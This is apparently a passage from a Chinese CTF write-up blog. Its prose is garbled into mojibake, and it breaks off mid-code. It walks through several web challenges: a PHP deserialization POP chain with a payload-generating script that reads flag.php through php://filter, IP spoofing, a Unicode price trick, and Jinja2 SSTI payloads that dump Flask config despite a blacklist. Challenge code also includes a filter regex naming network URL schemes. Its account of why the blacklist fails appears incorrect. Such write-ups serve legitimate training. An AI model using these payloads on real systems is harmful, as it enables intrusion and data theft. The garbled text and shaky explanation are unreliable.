<p>å…ˆçœ‹__toStringæ–¹æ³•ï¼Œæ˜¯ä¸ªè¾“å‡ºç‚¹</p>
<p>æœ€ååˆ†æTestç±»</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>__get()æ–¹æ³•ï¼Œ(å½“è®¿é—®ç±»ä¸­çš„ç§æœ‰å±æ€§æˆ–è€…æ˜¯ä¸å­˜åœ¨çš„å±æ€§ï¼Œè§¦å‘__geté­”æœ¯æ–¹æ³•)ï¼Œè€ŒModifierç±»ä¸­æœ‰ç§æœ‰å±æ€§ï¼Œè¿™ä¸¤ä¸ªç±»é…åˆä¸€ä¸‹</p>
<p>æ€è·¯ï¼š<br>é¦–å…ˆä½¿</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$var</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
<p>ç”±äºprotectè¢«ä¿æŠ¤çš„å˜é‡ç±»å¤–éƒ¨æ— æ³•è®¿é—®ï¼Œæ‰€ä»¥åœ¨ç±»é‡Œé¢å®šä¹‰<br>ç„¶åä½¿ç”¨Testç±»é‡Œçš„__getæ–¹æ³•è°ƒç”¨Modifierç±»ä¸­çš„__invokeæ–¹æ³•ï¼Œä½¿$pè¿™ä¸ªå˜é‡ä¸ºModifierè¿™ä¸ªå¯¹è±¡å°±å¯ä»¥è°ƒç”¨__invokeæ–¹æ³•ï¼Œæœ€åä½¿ç”¨Showè¿™ä¸ªç±»é‡Œçš„__toStringæ–¹æ³•è¾“å‡ºè¢«åŒ…å«çš„flag<br>ä½¿ç”¨Testç±»ä¸­çš„__Getæ–¹æ³•è°ƒç”¨Modifierç±»ä¸­çš„__invokeæ–¹æ³•å¾ˆç®€å•<br>ä½¿Test-&gt;p&#x3D;new Modifier();<br>Showä¸­__wakeupæ–¹æ³• ï¼Œpreg_matchå¯¹ç±»ä¸­çš„sourceè¿›è¡Œæ¯”è¾ƒï¼Œå°†å®ƒä½œä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å°±è°ƒç”¨äº†__toStringæ–¹æ³•<br>__toStringæ˜¯åœ¨å¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²çš„æ—¶å€™è°ƒç”¨<br>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦ä½¿Show-&gt;source &#x3D; new Show();<br>å³å¯è°ƒç”¨__toStringæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;index.php&quot;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;source . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>-&gt;source = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;source-&gt;str = <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>

<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="/images/MQ083D130OO6OYCG15V.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œçš„buy it now æ˜¯æœ‰è¶…é“¾æ¥çš„<br>å¾®ä¿¡æ‰«ä¸€æ‰«å…ˆ<br><img src="/images/YNUL3D1EKV4C5VP4.png" srcset="/img/loading.gif" lazyload><br>æ‹œæ‰˜ï¼ä½ ä¸ä¼šçœŸçš„æƒ³PYåˆ°flagå§ï¼Œè¿™æ ·å¯æ˜¯è¿è§„çš„ï¼å†å¥½å¥½åˆ†æä¸€ä¸‹ç•Œé¢ä»£ç å§<br>å¥½å§ï¼Œå¦è¾Ÿè¹Šå¾„<br>å›åˆ°ä¸»é¡µé¢ï¼Œå®¡è®¡æºä»£ç </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>     <span class="hljs-built_in">hash</span> = hex_md5(code);<br>     <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>;<br>   &#125;<br>   <span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-keyword">var</span> code = document.getElementById(<span class="hljs-string">&quot;vcode&quot;</span>).value;<br>     <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>       <span class="hljs-keyword">if</span>(hex_md5(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>         alert(<span class="hljs-string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯ï¼&quot;</span>);<br>         window.location = <span class="hljs-string">&quot;./flag.php&quot;</span><br>       &#125;<span class="hljs-keyword">else</span>&#123;<br>         alert(<span class="hljs-string">&quot;ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼&quot;</span>);<br>       &#125;<br>     &#125;<span class="hljs-keyword">else</span>&#123;<br>       alert(<span class="hljs-string">&quot;è¯·è¾“å…¥æˆæƒç &quot;</span>);<br>     &#125;<br>     <br>   &#125;<br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œæœ‰ä¸ªflag.phpï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥æŸ¥çœ‹<br><img src="/images/Y1HGFWJWYOPXT3ZN3L.png" srcset="/img/loading.gif" lazyload><br>é‡ç‚¹æ˜¯è¿™ä¸€å¥è¯ï¼š<br>éªŒè¯é€»è¾‘æ˜¯åœ¨åç«¯çš„ï¼Œé™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡æœ‰äººå¯ä»¥çœ‹åˆ°flag<br>é™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Ÿ<br>ä¼ªé€ IPè¯•è¯•<br><img src="/images/6OLV4250O66RIYHW5SM.png" srcset="/img/loading.gif" lazyload><br><img src="/images/JFJQBMOYHR56UBL4MK.png" srcset="/img/loading.gif" lazyload><br>æºä»£ç ä¸­æŸ¥çœ‹flag</p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="/images/HHE63JPRZK5VP8UO.png" srcset="/img/loading.gif" lazyload><br>çœ‹åˆ°ç»™çš„å†å²è¾“å…¥ï¼Œè¿˜ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œæ³¨å…¥äº†åŠå¤©æ¯›éƒ½æ²¡æœ‰<br>çœ‹çœ‹æºç ğŸ‘€<br><img src="/images/CCBM03PTUN15DEK50F.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œæç¤º<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>éå¸¸é‡è¦<br>ä½†æ˜¯å¾ˆå¤šçš„ç½‘ç«™éƒ½æ˜¯utf-8ç¼–ç ï¼Œä¸ºä»€ä¹ˆä¼šè¯´è¿™é‡Œå¾ˆé‡è¦?<br>å›åˆ°è´­ä¹°ç•Œé¢ï¼Œæˆ‘ä»¬è¾“å…¥å…¶ä»–çš„ä»·æ ¼ï¼Œå‘ç°è¾“å…¥10çš„æ—¶å€™æœ‰æç¤º<br><img src="/images/SJJVW90CRI7BP0MK.png" srcset="/img/loading.gif" lazyload><br>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦<br>ä¸€ä¸ªå­—ç¬¦èƒ½å¤Ÿè´­ä¹°çš„å°±åªæœ‰å‰ä¸‰åªç‹¬è§’å…½ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰è´­ä¹°æˆåŠŸï¼Œæƒ³å¿…çªç ´ç‚¹åœ¨ç¬¬å››åªç‹¬è§’å…½ä¸Šï¼Œå…ˆæ‰¾åˆ°ä¸€ä¸ªæ¯”1337å¤§çš„æ•°<br>å½“ä»€ä¹ˆéƒ½ä¸è¾“å…¥ç›´æ¥è´­ä¹°æ—¶ä¼šå‡ºç°ä»¥ä¸‹æç¤º<br><img src="/images/435G6RU5DA6HCN26.png" srcset="/img/loading.gif" lazyload><br>çœ‹ä¸€ä¸‹ unicodedata.numericè¿™ä¸ªå‡½æ•°ï¼Œä»–çš„å‚æ•°æ˜¯price<br>å‰ç«¯htmlä½¿ç”¨çš„æ˜¯utf-8ï¼Œåç«¯pythonå¤„ç†ä½¿ç”¨çš„æ˜¯unicodeï¼Œç¼–ç ä¸ä¸€è‡´é€ æˆäº†è½¬ç é—®é¢˜<br><img src="/images/LQ1B771Y202IYPQOL.png" srcset="/img/loading.gif" lazyload><br><img src="/images/D585S3GQB0CTVOHB9L.png" srcset="/img/loading.gif" lazyload><br>ä¼ å…¥ä¸‡è¯•è¯•<br><img src="/images/IZ87OSEJ633X4O7QBBE.png" srcset="/img/loading.gif" lazyload><br>flagæˆåŠŸå›æ˜¾<br>å¦‚æœä¸æƒ³ç”¨ä¸‡çš„è¯å¯ä»¥å»æ‰¾ä¸€ä¸ªUnicodeç¼–ç ç½‘ç«™<br><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">ä¼ é€é—¨</a><br>ä¾‹å¦‚è¾“å…¥ten thousand<br><img src="/images/NMW9LJLO5NYALOX.png" srcset="/img/loading.gif" lazyload><br><img src="/images/RT4UKBT5P80RZT5.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°ä¸€ä¸ªNumeric Valueå¤§äºç­‰äº10000çš„æ•°å€¼<br>ç›´æ¥å¤åˆ¶ä¸Šé¢çš„ç‰¹æ®Šç¬¦å·æˆ–è€…ä¸‹é¢çš„UTF-8 Encoding<br>æ‰¾åˆ°UTF-8 Encodingï¼š0xE1 0x8D 0xBC<br>å°†0xæ›¿æ¢æˆ%<br><img src="/images/LLNDIZB7VBGLF9K12S.png" srcset="/img/loading.gif" lazyload><br>è´­ä¹°å¾—åˆ°flag</p>
<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<span class="hljs-comment">#åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ã€åˆå§‹åŒ–Flaskåº”ç”¨</span><br><br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#ä»ç¯å¢ƒå˜é‡ä¸­è·å–åä¸º&#x27;FLAG&#x27;çš„å€¼ï¼Œç„¶åå°†å…¶å­˜å‚¨åœ¨Flaskåº”ç”¨çš„é…ç½®ä¸­</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-comment">#å®šä¹‰æ ¹è·¯ç”±&#x27;/&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<span class="hljs-comment">#è¿”å›å½“å‰æ–‡ä»¶çš„å†…å®¹</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span><span class="hljs-comment">#å®šä¹‰è·¯ç”± /shrine/&lt;path:shrine&gt;ï¼Œä½¿ç”¨ Jinja2 æ¨¡æ¿æ¸²æŸ“è·¯å¾„å‚æ•°ï¼š</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<span class="hljs-comment">#å½“è®¿é—® /shrine/&lt;path:shrine&gt; è·¯å¾„æ—¶ï¼Œä¼šè°ƒç”¨ shrine å‡½æ•°</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<br><br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure>
<p>é¦–å…ˆåœ¨shrineè·¯å¾„ä¸‹æµ‹è¯•sstièƒ½å¦æ­£å¸¸æ‰§è¡Œ</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">6</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/LK7HQZB5I2M18ONT.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">safe_jinja</span>(s):<br>       s = s.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>       return <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) for c in blacklist]) + s<br><br>   return flask.<span class="hljs-built_in">render_template_string</span>(<span class="hljs-built_in">safe_jinja</span>(shrine))<br></code></pre></td></tr></table></figure>
<p>å†æ¥åˆ†æè¿™æ®µä»£ç <br>è¿™æ®µä»£ç ä½¿ç”¨äº†ä¸€ä¸ªé»‘åå•blacklist,å…¶ä¸­åŒ…å«äº†è¦åœ¨ä¼ å…¥çš„å­—ç¬¦ä¸²sä¸­è¢«æ›¿æ¢çš„ä¸€äº›å­—ç¬¦ä¸²(åœ¨è¿™é‡Œconfigå’Œself)ã€‚å¯¹äºæ¯ä¸ªé»‘åå•çš„å­—ç¬¦ä¸²cï¼Œå®ƒéƒ½ä¼šç”Ÿæˆä¸€ä¸ªjinja2æ¨¡æ¿è¯­æ³•çš„å­—ç¬¦ä¸²<code>&#123;&#123;% set c=None %&#125;&#125;</code>ï¼Œç„¶åå°†è¿™äº›å­—ç¬¦ä¸²è¿æ¥åˆ°åŸå§‹çš„å­—ç¬¦ä¸²sä¹‹å<br>pythonè¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°æ¯”å¦‚url_forå’Œget_flashed_messages<br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__&#125;&#125;<span class="hljs-regexp">//</span>è¿”å›è§†å›¾å‡½æ•°çš„urlï¼Œå¯¹å¯¹è±¡çš„å…¨å±€å‘½åç©ºé—´çš„è®¿é—®<br></code></pre></td></tr></table></figure>
<p><img src="/images/PT26X6LGOGY57QTEN2.png" srcset="/img/loading.gif" lazyload><br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>current_app å…è®¸ä½ è·å–å½“å‰åº”ç”¨çš„ä¸€äº›å±æ€§å’Œé…ç½®ä¿¡æ¯<br><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br>-&gt;è·å–flag<br></code></pre></td></tr></table></figure>
<p><strong>configä¸æ˜¯è¢«åˆ—ä¸ºé»‘åå•äº†å˜›ï¼Ÿï¼Ÿï¼Ÿ</strong><br>å‡è®¾shrineä¸º<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br>ç„¶åä¼ é€’ç»™safe_jinjaå‡½æ•°ï¼Œåœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼ŒblackliståŒ…å«äº†config,æ‰€ä»¥ç”Ÿæˆçš„jinja2æ¨¡æ¿å­—ç¬¦ä¸²å¦‚ä¸‹</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;% <span class="hljs-name">set</span> <span class="hljs-attr">config</span>=None %&#125;&#125;</span><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªå­—ç¬¦ä¸²ä¸­çš„<code>&#123;&#123;% set config=None %&#125;&#125;</code>éƒ¨åˆ†æ˜¯ä¸ºäº†å°è¯•è®¾ç½®configå˜é‡ä¸ºNone,ä½†ç”±äºJinja2çš„è¯­æ³•ï¼Œè¿™ä¸ªè®¾ç½®æ“ä½œåœ¨å­—ç¬¦ä¸²ä¸­ä»…ä»…æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸ä¼šçœŸæ­£åœ°æ‰§è¡Œã€‚</p>
<p>å› æ­¤ï¼Œå°½ç®¡çœ‹èµ·æ¥å¥½åƒconfigè¢«è®¾ç½®ä¸ºNone,å®é™…ä¸ŠJinja2åªæ˜¯æŠŠè¿™éƒ¨åˆ†å½“ä½œæ™®é€šçš„æ–‡æœ¬å¯¹å¾…ï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œå®ƒã€‚å› æ­¤ï¼Œåœ¨æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œconfigçš„å€¼ä»ç„¶æ˜¯<code>url_for.__globals__[&#39;current_app&#39;].config</code>,è€Œæ²¡æœ‰è¢«è®¾ç½®ä¸ºNone<br><img src="/images/XCUV93B45O8I24U3VXW2.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>æ£€ç´¢æºä»£ç <br><img src="/images/U30NAQ0SZE9VDQ7O.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè¿›å»åº·åº·</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ 